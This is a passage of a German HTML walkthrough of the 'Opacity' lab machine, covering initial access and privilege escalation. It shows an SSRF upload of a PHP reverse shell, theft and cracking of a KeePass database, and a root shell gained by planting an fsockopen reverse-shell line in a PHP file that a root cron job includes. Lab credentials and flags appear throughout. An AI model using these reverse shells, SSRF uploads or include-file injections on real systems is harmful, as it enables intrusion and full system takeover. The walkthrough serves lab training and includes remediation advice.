+$ <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span>
+www-data@opacity:/var/www/html$<span class="command"> export TERM=xterm</span>
+www-data@opacity:/var/www/html$<span class="command"> # Ctrl+Z</span>
+zsh: suspended  nc -lvnp 9001
+┌──(root㉿cyber)-[~]
+└─# <span class="command">stty raw -echo;fg</span>
+[1]  + continued  nc -lvnp 9001
+www-data@opacity:/var/www/html$<span class="command"> reset</span>
+                     </pre>
+                    <div class="prompt">www-data@opacity:/$</div> <!-- Korrigierter Prompt nach Stabilisierung -->
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Die erhaltene Shell wird stabilisiert:
+1.  `python3 -c 'import pty;pty.spawn("/bin/bash")'`: Startet eine interaktive Bash-Shell mit PTY.
+2.  `export TERM=xterm`: Setzt die Terminal-Variable für bessere Kompatibilität mit Tools wie `clear`.
+3.  `Ctrl+Z`: Sendet den Listener-Prozess (`nc`) in den Hintergrund auf dem Angreifer-System.
+4.  `stty raw -echo; fg`: Stellt das lokale Terminal auf `raw`-Modus (leitet Tastatureingaben direkt weiter) und holt den `nc`-Prozess wieder in den Vordergrund.
+5.  `reset`: Setzt das Terminal auf dem Ziel zurück, um Anzeigefehler zu beheben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Standardverfahren zur Stabilisierung einer Reverse Shell, um eine komfortablere und funktionsfähigere Arbeitsumgebung zu erhalten.</p>
+            <!-- Initial Access Inhalt endet hier -->
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept: Server-Side Request Forgery (SSRF) to Remote Code Execution (RCE)</h2>
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Die Webanwendung unter `/cloud/storage.php` ist anfällig für SSRF. Sie akzeptiert eine URL zu einer externen Ressource, lädt diese herunter und speichert sie im Web-Root unter `/cloud/images/`. Da der Speicherort web-zugänglich ist und der Server PHP-Dateien auch mit irreführenden Endungen ausführt, kann diese SSRF-Schwachstelle genutzt werden, um eine PHP-Reverse-Shell hochzuladen und durch direkten Aufruf der hochgeladenen Datei Remote Code Execution als Benutzer `www-data` zu erlangen.</p>
+            <p class="evaluation"><strong>Voraussetzungen:</strong>
+                <ul>
+                    <li>Zugriff auf die Webanwendung (hier nach Login mit `admin:oncloud9`).</li>
+                    <li>Ein Webserver auf dem Angreifer-System, um den PHP-Payload zu hosten.</li>
+                    <li>Ein Listener (z.B. Netcat) auf dem Angreifer-System.</li>
+                    <li>Eine PHP-Reverse-Shell-Datei (`rev.php`).</li>
+                </ul>
+            </p>
+            <p class="analysis"><strong>Schritt-für-Schritt Anleitung:</strong>
+                <ol>
+                    <li>Hoste die PHP-Reverse-Shell (`rev.php`) auf einem lokalen Webserver (z.B. `python3 -m http.server 8003`).</li>
+                    <li>Starte einen Netcat-Listener auf dem im Payload angegebenen Port (z.B. `nc -lvnp 9001`).</li>
+                    <li>Greife auf `http://opacity.hmv/cloud/storage.php` zu (nach dem Login).</li>
+                    <li>Gib im entsprechenden Formularfeld die URL zur Reverse-Shell-Datei auf dem Angreifer-Server an, eventuell mit einer täuschenden Endung (z.B. `http://[Angreifer-IP]:8003/rev.php .jpg`).</li>
+                    <li>Rufe die hochgeladene Datei im Browser auf dem Zielserver auf: `http://opacity.hmv/cloud/images/rev.php` (oder wie auch immer die Datei gespeichert wurde).</li>
+                </ol>
+            </p>
+            <p class="evaluation"><strong>Erwartetes Ergebnis:</strong> Der PHP-Code in `rev.php` wird auf dem Server ausgeführt, und eine Verbindung wird zum Netcat-Listener des Angreifers aufgebaut, wodurch eine Shell als `www-data` erlangt wird.</p>
+            <p class="recommendation"><strong>Beweismittel:</strong> Eingehende Verbindung auf dem Netcat-Listener, Ausführung von `id`-Befehl in der erhaltenen Shell zeigt `uid=33(www-data)`.</p>
+            <p class="recommendation"><strong>Risikobewertung:</strong> Hoch. SSRF kombiniert mit der Möglichkeit, beliebige abgerufene Dateien im Web-Root zu speichern und auszuführen, führt direkt zu RCE. Dies erlaubt einem Angreifer initialen Zugriff auf das System.</p>
+            <p class="recommendation"><strong>Empfehlungen (Admin):</strong>
+                <ul>
+                    <li>Validieren Sie URLs, die von Benutzern eingegeben werden, streng. Beschränken Sie erlaubte Protokolle (nur HTTP/HTTPS) und Ziele (Whitelist von erlaubten Hosts, keine internen IPs/Localhost).</li>
+                    <li>Speichern Sie von externen Quellen abgerufene Dateien niemals direkt im Web-Root oder an einem Ort, an dem sie vom Webserver ausgeführt werden könnten. Speichern Sie sie an einem sicheren Ort außerhalb des Web-Roots.</li>
+                    <li>Konfigurieren Sie den Webserver so, dass er Dateien nicht basierend auf ihrem Inhalt oder Shebang als Skripte ausführt, wenn sie eine harmlose Endung haben (z.B. `.jpg`).</li>
+                    <li>Entfernen Sie die anfällige `storage.php`-Funktionalität oder implementieren Sie sie sicher neu.</li>
+                </ul>
+            </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <!-- Privilege Escalation Inhalt beginnt hier -->
+
+             <p class="analysis"><strong>Strategie Teil 1: Von `www-data` zu `sysadmin`</strong></p>
+             <p class="analysis">Nachdem die Shell als `www-data` erlangt wurde, erfolgt die Enumeration des Systems, um einen Weg zum Benutzer `sysadmin` zu finden. Ein entscheidender Fund ist die KeePass-Datenbankdatei `dataset.kdbx` im Verzeichnis `/opt`.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@opacity:/var$ <span class="command">cd /opt</span></div>
+                     <div class="prompt">www-data@opacity:/opt$ <span class="command">ls -la</span></div>
+                     <pre>
+total 12
+drwxr-xr-x  2 root     root     4096 Jul 26  2022 .
+drwxr-xr-x 19 root     root     4096 Jul 26  2022 ..
+<span class="command">-rwxrwxr-x  1 sysadmin sysadmin 1566 Jul  8  2022 dataset.kdbx</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Im Verzeichnis `/opt` wird die Datei `dataset.kdbx` gefunden. Sie gehört dem Benutzer `sysadmin` und hat Lese- und Ausführrechte für alle Benutzer (`-rwxrwxr-x`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `.kdbx`-Dateien sind KeePass-Passwort-Datenbanken. Diese Datei enthält wahrscheinlich Passwörter, möglicherweise auch das SSH-Passwort für `sysadmin`. Da `www-data` Leserechte hat, kann die Datei heruntergeladen werden.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@opacity:/opt$ <span class="command">python3 -m http.server 9002</span></div>
+                     <pre>
+Serving HTTP on 0.0.0.0 port 9002 (http://0.0.0.0:9002/) ...
+<span class="password">192.168.2.130 - - [25/Apr/2023 14:19:07] "GET /dataset.kdbx HTTP/1.1" 200 -</span>
+                    </pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.138:9002/dataset.kdbx</span></div>
+                     <pre>
+--2023-04-25 16:19:06--  http://192.168.2.138:9002/dataset.kdbx
+Verbindungsaufbau zu 192.168.2.138:9002 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: 1566 (1,5K) [application/octet-stream]
+Wird in »dataset.kdbx« gespeichert.
+
+dataset.kdbx            100%[=============================>]   1,53K  --.-KB/s    in 0,02s
+
+<span class="password">2023-04-25 16:19:06 (83,7 KB/s) - »dataset.kdbx« gespeichert [1566/1566]</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Um die Datei `dataset.kdbx` herunterzuladen, wird auf dem Zielsystem im `/opt`-Verzeichnis ein temporärer Python-HTTP-Server auf Port `9002` gestartet. Anschließend wird die Datei vom Angreifer-System mit `wget` heruntergeladen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolgreicher Transfer der KeePass-Datenbank zum Angreifer-System zur weiteren Analyse.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">keepass2john dataset.kdbx > hash</span></div>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Das Tool `keepass2john` wird verwendet, um den Master-Passwort-Hash aus der `.kdbx`-Datei zu extrahieren und in einem Format zu speichern, das `john` (John the Ripper) versteht. Der Hash wird in die Datei `hash` umgeleitet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Vorbereitung für den Brute-Force-Angriff auf das Master-Passwort der KeePass-Datenbank.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span></div>
+                     <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 100000 for all loaded hashes
+Cost 2 (version) is 2 for all loaded hashes
+Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
+<span class="password">741852963</span>        (dataset)
+<span class="password">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
+1g 0:00:00:02 DONE (2023-04-25 16:19) 0.3401g/s 326.5p/s 326.5c/s 326.5C/s 134679..151515
+Use the "--show" option to display all of the cracked passwords reliably
+                     </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> `john` wird mit der `rockyou.txt`-Wortliste auf die extrahierte Hash-Datei angesetzt. John findet erfolgreich das Master-Passwort für die KeePass-Datenbank: `<span class="password">741852963</span>`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritischer Erfolg! Das Master-Passwort für die Passwort-Datenbank wurde gefunden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+keepass Windows:
+<span class="password">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
+<span class="password">Cl0udP4ss40p4city#8700</span>
+<span class="password">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die KeePass-Datenbank `dataset.kdbx` wird mit dem geknackten Master-Passwort (`741852963`) geöffnet (vermutlich mit KeePassXC oder einem ähnlichen Tool). In der Datenbank wird ein Eintrag gefunden, der das Passwort `<span class="password">Cl0udP4ss40p4city#8700</span>` enthält, wahrscheinlich für den Benutzer `sysadmin`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das SSH-Passwort für `sysadmin` wurde erfolgreich extrahiert. Dies sollte nun den SSH-Login ermöglichen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh sysadmin@opacity.hmv</span></div>
+                     <pre>
+sysadmin@opacity.hmv's password: <span class="password">Cl0udP4ss40p4city#8700</span>
++Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue 25 Apr 2023 02:25:41 PM UTC
+
+[...]
+
+Last login: Thu Jul 28 09:29:38 2022 from 10.0.2.6
+                     </pre>
+                      <div class="prompt">sysadmin@opacity:~$ <span class="command">ls</span></div>
+                      <pre>local.txt  scripts  snap</pre>
+                      <div class="prompt">sysadmin@opacity:~$ <span class="command">id</span></div>
+                      <pre>uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin),24(cdrom),30(dip),46(plugdev)</pre>
+                      <div class="prompt">sysadmin@opacity:~$</div>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Mit dem aus der KeePass-Datenbank extrahierten Passwort wird erfolgreich eine SSH-Verbindung als Benutzer `sysadmin` zum Zielsystem `opacity.hmv` hergestellt. Der `id`-Befehl bestätigt die Identität als `sysadmin` (UID 1000).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der erste Teil der Privilegieneskalation ist erfolgreich abgeschlossen. Wir haben nun eine interaktive Shell als Benutzer `sysadmin`.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">sysadmin@opacity:~$ <span class="command">cat local.txt</span></div>
+                    <pre><span class="password">6661b61b44d234d230d06bf5b3c075e2</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Im Home-Verzeichnis von `sysadmin` wird die Datei `local.txt` (User-Flag) gefunden und deren Inhalt ausgelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das User-Flag wurde erfolgreich erfasst.</p>
+
+            <p class="analysis"><strong>Strategie Teil 2: Von `sysadmin` zu `root`</strong></p>
+            <p class="analysis">Nun wird nach einem Weg gesucht, vom `sysadmin`-Account zu `root`-Rechten zu gelangen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">sysadmin@opacity:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+[sudo] password for sysadmin: <span class="password">Cl0udP4ss40p4city#8700</span>
+<span class="password">Sorry, user sysadmin may not run sudo on opacity.</span>
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `sudo -l` wird ausgeführt, um zu prüfen, ob der Benutzer `sysadmin` irgendwelche Befehle mit `sudo` ausführen darf. Nach Eingabe des Passworts wird angezeigt, dass `sysadmin` keine `sudo`-Rechte hat.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Standardweg über `sudo` ist hier nicht möglich.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">sysadmin@opacity:~$ <span class="command">passwd</span></div>
+                     <pre>
+Changing password for sysadmin.
+Current password: <span class="password">Cl0udP4ss40p4city#8700</span>
+
+       New password: Benni1908
+Retype new password: Benni1908
+<span class="password">passwd: password updated successfully</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Das Passwort für den `sysadmin`-Benutzer wird geändert. Dies ist für die Privilegieneskalation selbst nicht direkt relevant, könnte aber Teil einer Strategie sein, den Account nach der Kompromittierung (theoretisch) zu sichern oder für spätere Zugriffe ein bekanntes Passwort zu setzen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Keine direkte Relevanz für den Privesc-Vektor, aber eine durchgeführte Aktion.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">sysadmin@opacity:~$ <span class="command">cd scripts/</span></div>
+                    <div class="prompt">sysadmin@opacity:~/scripts$ <span class="command">ls</span></div>
+                    <pre>lib  script.php</pre>
+                    <div class="prompt">sysadmin@opacity:~/scripts$ <span class="command">cat script.php</span></div>
+                    <pre>
+ 
+
+//Backup of scripts sysadmin folder
+<span class="command">require_once('lib/backup.inc.php');</span>
+<span class="command">zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');</span>
+echo 'Successful', PHP_EOL;
+
+//Files scheduled removal
+$dir = "/var/www/html/cloud/images";
+if(file_exists($dir)){
+    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
+    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
+    foreach ( $ri as $file ) {
+        $file->isDir() ?  rmdir($file) : unlink($file);
+    }
+}
+ 
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Im Home-Verzeichnis von `sysadmin` befindet sich ein Verzeichnis `scripts`. Darin liegt die Datei `script.php`. Der Inhalt zeigt, dass dieses Skript eine Datei `lib/backup.inc.php` einbindet (`require_once`) und dann den Inhalt von `/home/sysadmin/scripts` in ein Zip-Archiv `/var/backups/backup.zip` packt. Anschließend löscht es Dateien im Web-Upload-Verzeichnis `/var/www/html/cloud/images`. Es ist sehr wahrscheinlich, dass dieses Skript regelmäßig durch einen Cronjob ausgeführt wird, und zwar als `root` (da es in `/var/backups` schreibt und Systembereinigung durchführt).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein vielversprechender Vektor! Wenn `script.php` als `root` läuft und `lib/backup.inc.php` einbindet, können wir versuchen, `lib/backup.inc.php` zu modifizieren, um eigenen Code als `root` auszuführen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">sysadmin@opacity:~/scripts$ <span class="command">ls -la script.php</span></div>
+                     <pre><span class="command">-rw-r----- 1 root sysadmin 519 Jul  8  2022 script.php</span></pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Berechtigungen von `script.php` werden geprüft. Sie gehört `root`, Gruppe `sysadmin`, und hat `rw-r-----`-Rechte. Der Benutzer `sysadmin` ist in der Gruppe `sysadmin` und hat somit Leserechte, aber **keine Schreibrechte** auf `script.php` selbst.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wir können `script.php` nicht direkt bearbeiten. Der Angriff muss über die eingebundene Datei `lib/backup.inc.php` erfolgen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">sysadmin@opacity:~/scripts$ <span class="command">cd /var/backups/</span></div>
+                    <div class="prompt">sysadmin@opacity:/var/backups$ <span class="command">unzip backup.zip -d /home/sysadmin/scripts</span></div>
+                     <pre>
+Archive:  backup.zip
+replace /home/sysadmin/scripts/script.php? [y]es, [n]o, [A]ll, [N]one, [r]ename: A
+<span class="password">error:  cannot delete old /home/sysadmin/scripts/script.php</span>
+        <span class="password">Permission denied</span>
+  inflating: /home/sysadmin/scripts/lib/backup.inc.php
+  inflating: /home/sysadmin/scripts/lib/phplib.php
+  inflating: /home/sysadmin/scripts/lib/owlapi.php
+[...]
+  inflating: /home/sysadmin/scripts/lib/xmlapi.php
+                     </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Das Backup-Archiv `/var/backups/backup.zip` wird in das Verzeichnis `/home/sysadmin/scripts` entpackt. Der Versuch, `script.php` zu überschreiben, schlägt erwartungsgemäß wegen fehlender Rechte fehl. Wichtiger ist jedoch, dass die Dateien im Unterverzeichnis `lib/`, einschließlich `backup.inc.php`, erfolgreich entpackt und überschrieben werden, da `sysadmin` Schreibrechte im Verzeichnis `/home/sysadmin/scripts/lib/` hat.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt, dass wir die Kontrolle über den Inhalt von `lib/backup.inc.php` erlangen können, indem wir das Backup entpacken.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">sysadmin@opacity:/var/backups$ <span class="command">nano /home/sysadmin/scripts/lib/backup.inc.php</span></div>
+                    <!-- Editor-Ansicht nicht gezeigt -->
+                    <div class="prompt">sysadmin@opacity:/var/backups$ <span class="command">cat /home/sysadmin/scripts/lib/backup.inc.php</span></div>
+                    <pre>
+ 
+
+
+ini_set('max_execution_time', 600);
+ini_set('memory_limit', '1024M');
+
+
+function zipData($source, $destination) {
+[...] // Originaler Funktionscode
+}
+<span class="password">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
+<span class="password">                            Hinzugefügt</span>
+<span class="password">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
+<span class="command">$sock=fsockopen("192.168.2.130",9008);exec("/bin/bash <&3 >&3 2>&3");</span>
+<span class="password">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
+ 
+                    </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Datei `/home/sysadmin/scripts/lib/backup.inc.php` wird mit `nano` bearbeitet. Am Ende der Datei wird PHP-Code für eine Reverse Shell hinzugefügt: `$sock=fsockopen("192.168.2.130",9008);exec("/bin/bash <&3 >&3 2>&3");`. Dieser Code versucht, eine Verbindung zum Angreifer-System (`192.168.2.130`) auf Port `9008` herzustellen und dann eine Bash-Shell über diese Verbindung zu starten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Payload für die Root-Reverse-Shell wurde erfolgreich in die Datei `backup.inc.php` injiziert. Wenn der Cronjob das Hauptskript `script.php` als `root` ausführt, wird dieser Code ebenfalls als `root` ausgeführt.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9008</span></div>
+                     <pre>
+listening on [any] 9008 ...
+                     </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird ein Netcat-Listener auf Port `9008` gestartet, um die erwartete Root-Shell zu empfangen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Vorbereitung auf den Empfang der Root-Shell.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9008</span></div>
+                     <pre>
+listening on [any] 9008 ...
+<span class="password">connect to [192.168.2.130] from (UNKNOWN) [192.168.2.138] 60124</span>
+<span class="command">id</span>
+<span class="password">uid=0(root) gid=0(root) groups=0(root)</span>
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Nach einer Wartezeit (ca. 1:30 Minuten, bis der Cronjob vermutlich lief) geht die Verbindung auf dem Listener ein. Der `id`-Befehl bestätigt, dass die erhaltene Shell als `root` (UID 0) läuft.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Die Rechteausweitung auf `root` war erfolgreich durch die Modifikation der von einem Root-Cronjob eingebundenen PHP-Datei.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Prompt der Root-Shell -->
+                     <pre>
+<span class="command">ls</span>
+<span class="command">proof.txt</span>
+snap
+<span class="command">cat proof.txt</span>
+<span class="password">ac0d56f93202dd57dcb2498c739fd20e</span>
+                    </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> In der Root-Shell wird das aktuelle Verzeichnis (vermutlich `/root`) aufgelistet. Die Datei `proof.txt` (Root-Flag) wird gefunden und mit `cat` ausgelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Root-Flag wurde erfolgreich erfasst.</p>
+            <!-- Privilege Escalation Inhalt endet hier -->
+        </section>
+
+        <!-- Flags Section (Korrekte Struktur gemäß Regeln) -->
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/sysadmin/local.txt</div> <!-- Kommando korrigiert -->
+                    <div class="flag-value"><span class="password">6661b61b44d234d230d06bf5b3c075e2</span></div> <!-- Flag aus Text -->
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/proof.txt</div> <!-- Kommando korrigiert -->
+                    <div class="flag-value"><span class="password">ac0d56f93202dd57dcb2498c739fd20e</span></div> <!-- Flag aus Text -->
+                </div>
+            </div>
+        </section> 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 25. April 2023</p> <!-- Datum eingefügt -->
+    </footer>
+</body>
+</html>
